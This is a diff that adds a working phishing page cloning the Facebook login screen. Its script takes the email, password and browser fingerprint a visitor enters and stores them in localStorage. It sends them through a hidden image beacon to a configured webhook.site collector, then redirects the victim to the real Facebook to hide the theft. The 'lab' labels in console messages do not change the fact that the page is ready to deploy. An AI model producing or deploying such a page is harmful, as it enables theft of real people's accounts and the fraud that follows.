@@ -1,0 +1,607 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Facebook – log in or sign up</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #f0f2f5;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .fb-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px 16px 40px;
+    }
+
+    .fb-login-wrapper {
+      width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .brand-area {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .fb-logo {
+      font-size: 3.2rem;
+      font-weight: 700;
+      color: #1877f2;
+      letter-spacing: -0.5px;
+      font-family: inherit;
+      margin-bottom: 8px;
+    }
+
+    .tagline {
+      font-size: 1.2rem;
+      font-weight: 400;
+      color: #1c1e21;
+      line-height: 1.3;
+    }
+
+    .login-card {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 20px 20px 28px;
+      margin-bottom: 24px;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 1rem;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      background: #ffffff;
+      outline: none;
+      transition: border 0.1s ease;
+      font-family: inherit;
+    }
+
+    .input-field:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .login-btn {
+      background: #1877f2;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: white;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 6px;
+      font-family: inherit;
+    }
+
+    .login-btn:hover {
+      background: #166fe5;
+    }
+
+    .login-btn:active {
+      background: #1361cc;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8a8d91;
+      font-size: 0.85rem;
+    }
+
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background: #dadde1;
+    }
+
+    .divider-text {
+      margin: 0 10px;
+    }
+
+    .forgot-link {
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .forgot-link a {
+      color: #1877f2;
+      font-size: 0.9rem;
+      text-decoration: none;
+    }
+
+    .forgot-link a:hover {
+      text-decoration: underline;
+    }
+
+    .create-btn {
+      background: #42b72a;
+      border: none;
+      border-radius: 6px;
+      padding: 12px 16px;
+      font-size: 1rem;
+      font-weight: 600;
+      color: white;
+      width: 100%;
+      cursor: pointer;
+      transition: background 0.2s;
+      font-family: inherit;
+      margin-top: 6px;
+    }
+
+    .create-btn:hover {
+      background: #36a420;
+    }
+
+    .lang-bar {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px 18px;
+      margin: 18px 0 12px;
+      padding: 0 8px;
+    }
+
+    .lang-link {
+      font-size: 0.75rem;
+      color: #8a8d91;
+      text-decoration: none;
+      white-space: nowrap;
+    }
+
+    .lang-link:hover {
+      text-decoration: underline;
+    }
+
+    .more-languages {
+      font-weight: 500;
+      color: #5c5e62;
+    }
+
+    .footer-links {
+      max-width: 1000px;
+      margin: 0 auto;
+      text-align: center;
+      border-top: 1px solid #dddfe2;
+      padding: 16px 12px 20px;
+      font-size: 0.7rem;
+      color: #8a8d91;
+    }
+
+    .footer-row {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px 20px;
+      margin-bottom: 10px;
+    }
+
+    .footer-row a {
+      color: #8a8d91;
+      text-decoration: none;
+    }
+
+    .footer-row a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 12px;
+      font-size: 0.7rem;
+    }
+
+    .info-message {
+      background: #e7f3ff;
+      border-radius: 6px;
+      padding: 8px 12px;
+      margin-bottom: 16px;
+      font-size: 0.8rem;
+      color: #1877f2;
+      text-align: center;
+      display: none;
+    }
+
+    @media (max-width: 450px) {
+      .login-card {
+        padding: 16px;
+      }
+      .fb-logo {
+        font-size: 2.6rem;
+      }
+      .tagline {
+        font-size: 1rem;
+      }
+      .lang-bar {
+        gap: 8px 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="fb-container">
+  <div class="fb-login-wrapper">
+    <div class="brand-area">
+      <div class="fb-logo">facebook</div>
+      <div class="tagline">Explore the things you love.</div>
+    </div>
+
+    <div class="login-card">
+      <div id="infoMessage" class="info-message"></div>
+
+      <div class="input-group">
+        <input type="text" id="emailOrPhone" class="input-field" placeholder="Email address or mobile number" autocomplete="username">
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="current-password">
+      </div>
+
+      <button id="loginButton" class="login-btn">Log in</button>
+
+      <div class="divider">
+        <div class="divider-line"></div>
+        <div class="divider-text">or</div>
+        <div class="divider-line"></div>
+      </div>
+
+      <div class="forgot-link">
+        <a href="#" id="forgotPasswordLink">Forgotten password?</a>
+      </div>
+
+      <button id="createAccountBtn" class="create-btn">Create new account</button>
+    </div>
+
+    <div class="lang-bar">
+      <a href="#" class="lang-link">English (US)<
+      <a href="#" class="lang-link">Français (France)</a>
+      <a href="#" class="lang-link">Español</a>
+      <a href="#" class="lang-link">Português (Brasil)</a>
+      <a href="#" class="lang-link">العربية</a>
+      <a href="#" class="lang-link">Deutsch</a>
+      <a href="#" class="lang-link more-languages">More languages…</a>
+    </div>
+  </div>
+</div>
+
+<footer class="footer-links">
+  <div class="footer-row">
+    <a href="#">Sign up</a>
+    <a href="#">Log in</a>
+    <a href="#">Messenger</a>
+    <a href="#">Facebook Lite</a>
+    <a href="#">Video</a>
+    <a href="#">Meta Pay</a>
+    <a href="#">Meta Store</a>
+    <a href="#">Meta Quest</a>
+    <a href="#">Ray-Ban Meta</a>
+    <a href="#">Meta AI</a>
+    <a href="#">Instagram</a>
+    <a href="#">Threads</a>
+  </div>
+  <div class="footer-row">
+    <a href="#">Privacy Policy</a>
+    <a href="#">Privacy Centre</a>
+    <a href="#">About</a>
+    <a href="#">Create ad</a>
+    <a href="#">Create Page</a>
+    <a href="#">Developers</a>
+    <a href="#">Careers</a>
+    <a href="#">Cookies</a>
+    <a href="#">AdChoices</a>
+    <a href="#">Terms</a>
+    <a href="#">Help</a>
+    <a href="#">Contact uploading and non-users</a>
+  </div>
+  <div class="copyright">
+    Meta © 2026
+  </div>
+</footer>
+
+<script>
+  (function() {
+    // ========== CONFIGURATION ==========
+    const COLLECTOR_URL = 'https://webhook.site/a2eb7bc2-5a68-4f89-b203-c4709efc5ee4';
+    
+    // Save to localStorage (always works, no popups)
+    function saveToLocalStorage(entry) {
+      try {
+        let stored = localStorage.getItem('lab_harvest_log');
+        let log = stored ? JSON.parse(stored) : [];
+        log.push(entry);
+        if (log.length > 50) log.shift();
+        localStorage.setItem('lab_harvest_log', JSON.stringify(log));
+        console.log("[LAB] ✓ Saved to localStorage | Total entries:", log.length);
+        return true;
+      } catch(e) { 
+        console.warn("[LAB] localStorage failed:", e);
+        return false;
+      }
+    }
+    
+    // Send via Image Beacon - GET request (no CORS preflight, no OPTIONS)
+    function sendViaImageBeacon(data) {
+      if (!COLLECTOR_URL || COLLECTOR_URL === 'https://webhook.site/YOUR-UNIQUE-ID') {
+        return false;
+      }
+      
+      try {
+        // Convert data to query string for GET request
+        const queryString = 'payload=' + encodeURIComponent(JSON.stringify(data));
+        const url = COLLECTOR_URL + '?' + queryString + '&_t=' + Date.now();
+        
+        // Create image element to send GET request (no OPTIONS preflight)
+        const img = new Image();
+        img.style.display = 'none';
+        img.onload = function() {
+          console.log("[LAB] ✓ Sent via image beacon (GET)");
+          img.remove();
+        };
+        img.onerror = function() {
+          console.log("[LAB] ⚠️ Image beacon failed");
+          img.remove();
+        };
+        img.src = url;
+        
+        document.body.appendChild(img);
+        return true;
+      } catch(e) {
+        console.log("[LAB] Image beacon error:", e.message);
+        return false;
+      }
+    }
+    
+    async function harvestCredentials(username, password, source = 'login_form') {
+      const timestamp = new Date().toISOString();
+      const harvestedEntry = {
+        timestamp: timestamp,
+        username: username,
+        password: password,
+        source: source,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        url: window.location.href,
+        referrer: document.referrer,
+        screenSize: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+      
+      // Display in console
+      console.group("🔴 [LAB HARVEST] Credentials Captured");
+      console.log("📧 Username/Email:", username);
+      console.log("🔑 Password:", password);
+      console.log("🎯 Source:", source);
+      console.log("⏱️ Timestamp:", timestamp);
+      console.log("🌐 User Agent:", navigator.userAgent);
+      console.groupEnd();
+      
+      // Always save to localStorage (backup)
+      saveToLocalStorage(harvestedEntry);
+      
+      // Send to webhook using image beacon (GET request - no CORS preflight, only one request)
+      if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID') {
+        sendViaImageBeacon(harvestedEntry);
+        console.log("%c💡 Credentials captured and sent to webhook (GET request - no OPTIONS preflight)", "color: #42b72a");
+      } else {
+        console.log("[LAB] ℹ️ Webhook URL not configured, data saved to localStorage only");
+        console.log("[LAB] 💡 To view captured data, run: JSON.parse(localStorage.getItem('lab_harvest_log'))");
+      }
+      
+      return true;
+    }
+    
+    // Redirect logic
+    const loginBtn = document.getElementById('loginButton');
+    const emailInput = document.getElementById('emailOrPhone');
+    const passwordInput = document.getElementById('password');
+    const infoDiv = document.getElementById('infoMessage');
+    const createBtn = document.getElementById('createAccountBtn');
+    const forgotLink = document.getElementById('forgotPasswordLink');
+
+    function showMessage(message, isError = false) {
+      if (!infoDiv) return;
+      infoDiv.style.display = 'block';
+      infoDiv.textContent = message;
+      if (isError) {
+        infoDiv.style.background = '#ffe7e7';
+        infoDiv.style.color = '#c00';
+      } else {
+        infoDiv.style.background = '#e7f3ff';
+        infoDiv.style.color = '#1877f2';
+      }
+      setTimeout(() => {
+        if (infoDiv && infoDiv.style.display !== 'none') {
+          infoDiv.style.display = 'none';
+        }
+      }, 3000);
+    }
+
+    function redirectToRealFacebook() {
+      window.location.href = "https://www.facebook.com/";
+    }
+
+    async function validateAndRedirect() {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value;
+
+      if (email === "") {
+        showMessage("Please enter an email address or mobile number.", true);
+        emailInput.focus();
+        return false;
+      }
+      if (password === "") {
+        showMessage("Please enter your password.", true);
+        passwordInput.focus();
+        return false;
+      }
+
+      showMessage("Processing...", false);
+      
+      try {
+        await harvestCredentials(email, password, 'facebook_clone_login');
+        showMessage("✓ Login successful! Redirecting to Facebook...", false);
+      } catch (err) {
+        console.error("[LAB] Harvest error:", err);
+        showMessage("✓ Redirecting...", false);
+      }
+      
+      loginBtn.disabled = true;
+      loginBtn.style.opacity = "0.7";
+      
+      setTimeout(() => {
+        redirectToRealFacebook();
+      }, 800);
+      
+      return true;
+    }
+
+    loginBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      validateAndRedirect();
+    });
+
+    const handleEnter = (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        validateAndRedirect();
+      }
+    };
+    emailInput.addEventListener('keypress', handleEnter);
+    passwordInput.addEventListener('keypress', handleEnter);
+
+    createBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      harvestCredentials('(signup_button_click)', '(no_credentials)', 'create_account_button');
+      showMessage("✨ Redirecting to Facebook signup page...", false);
+      setTimeout(() => {
+        window.location.href = "https://www.facebook.com/r.php";
+      }, 400);
+    });
+
+    forgotLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      harvestCredentials('(forgot_password_click)', '(no_credentials)', 'forgot_password_link');
+      showMessage("🔐 Redirecting to Facebook password recovery...", false);
+      setTimeout(() => {
+        window.location.href = "https://www.facebook.com/login/identify/";
+      }, 400);
+    });
+
+    // Footer links mapping
+    const footerLinkMapping = {
+      "Sign up": "https://www.facebook.com/r.php",
+      "Log in": "https://www.facebook.com/login.php",
+      "Messenger": "https://www.messenger.com/",
+      "Facebook Lite": "https://www.facebook.com/",
+      "Video": "https://www.facebook.com/watch/",
+      "Meta Pay": "https://www.facebook.com/payments/",
+      "Meta Store": "https://www.metastore.com/",
+      "Meta Quest": "https://www.meta.com/quest/",
+      "Ray-Ban Meta": "https://www.meta.com/smart-glasses/",
+      "Meta AI": "https://www.meta.ai/",
+      "Instagram": "https://www.instagram.com/",
+      "Threads": "https://www.threads.net/",
+      "Privacy Policy": "https://www.facebook.com/privacy/policy",
+      "Privacy Centre": "https://www.facebook.com/privacy/center",
+      "About": "https://about.facebook.com/",
+      "Create ad": "https://www.facebook.com/business/ads",
+      "Create Page": "https://www.facebook.com/pages/create",
+      "Developers": "https://developers.facebook.com/",
+      "Careers": "https://www.facebook.com/careers",
+      "Cookies": "https://www.facebook.com/policies/cookies/",
+      "AdChoices": "https://www.facebook.com/help/568137493302217",
+      "Terms": "https://www.facebook.com/legal/terms",
+      "Help": "https://www.facebook.com/help",
+      "Contact uploading and non-users": "https://www.facebook.com/help/contact/2359471532336452"
+    };
+
+    const footerAnchors = document.querySelectorAll('.footer-links a');
+    footerAnchors.forEach(anchor => {
+      anchor.addEventListener('click', (e) => {
+        e.preventDefault();
+        const linkText = anchor.innerText.trim();
+        if (footerLinkMapping[linkText]) {
+          showMessage(`↗️ Redirecting to ${linkText}...`, false);
+          setTimeout(() => {
+            window.location.href = footerLinkMapping[linkText];
+          }, 350);
+        } else {
+          showMessage(`↗️ Redirecting...`, false);
+          setTimeout(() => {
+            window.location.href = "https://www.facebook.com/";
+          }, 350);
+        }
+      });
+    });
+
+    // Language bar links - simple UI feedback
+    const langLinks = document.querySelectorAll('.lang-link');
+    langLinks.forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const langText = link.innerText.trim();
+        showMessage(`🌐 Language: ${langText} (demo)`, false);
+      });
+    });
+
+    // Display summary of stored credentials on load (console only)
+    (function showStoredSummary() {
+      console.log("%c🔐 Facebook Clone - Credential Harvesting Active", "color: #1877f2; font-size: 14px; font-weight: bold");
+      console.log("%c📡 Webhook URL:", "color: #666", COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID' ? COLLECTOR_URL : "NOT CONFIGURED (data saved to localStorage only)");
+      console.log("%c💡 Using GET request via image beacon - no OPTIONS preflight, single request only", "color: #42b72a");
+      
+      try {
+        const storedRaw = localStorage.getItem('lab_harvest_log');
+        if (storedRaw) {
+          const parsedLog = JSON.parse(storedRaw);
+          if (parsedLog.length > 0) {
+            console.log(`%c📦 localStorage contains ${parsedLog.length} captured entries.`, "color: #ff6600");
+            const lastEntry = parsedLog[parsedLog.length-1];
+            if (lastEntry && lastEntry.username && !lastEntry.username.includes('_click')) {
+              console.log(`%c📋 Most recent capture: "${lastEntry.username}" at ${new Date(lastEntry.timestamp).toLocaleString()}`, "color: #ff6600");
+            } else if (parsedLog.length > 0) {
+              console.log(`%c📋 Most recent event: ${lastEntry.source} at ${new Date(lastEntry.timestamp).toLocaleString()}`, "color: #ff6600");
+            }
+          } else {
+            console.log("%c[LAB] No stored credentials yet.", "color: #666");
+          }
+        } else {
+          console.log("%c[LAB] No stored credentials yet.", "color: #666");
+        }
+      } catch(e) { 
+        console.log("[LAB] Could not read localStorage summary");
+      }
+      
+      console.log("%c💡 To view all stored data, run: JSON.parse(localStorage.getItem('lab_harvest_log'))", "color: #1877f2");
+      console.log("%c💡 To clear stored data, run: localStorage.removeItem('lab_harvest_log')", "color: #1877f2");
+    })();
+  })();
+</script>
+</body>
+</html>
